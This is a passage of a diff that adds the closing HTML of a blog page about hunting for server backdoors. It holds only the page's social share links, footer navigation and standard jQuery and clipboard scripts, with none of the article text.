+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/&text=应急响应-服务器后门程序排查"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/&title=应急响应-服务器后门程序排查"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/&is_video=false&description=应急响应-服务器后门程序排查"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=应急响应-服务器后门程序排查&body=Check out this article: https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/&title=应急响应-服务器后门程序排查"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/&title=应急响应-服务器后门程序排查"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/&title=应急响应-服务器后门程序排查"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/&title=应急响应-服务器后门程序排查"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/&name=应急响应-服务器后门程序排查&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/&t=应急响应-服务器后门程序排查"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    凉墨
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+ 
+  <link
+    rel="preload"
+    href="/lib/font-awesome/css/all.min.css"
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript
+    ><link
+      rel="stylesheet"
+      href="/lib/font-awesome/css/all.min.css"
+  /></noscript>
+
+
+    <!-- jquery -->
+
+  
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+  
+    
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
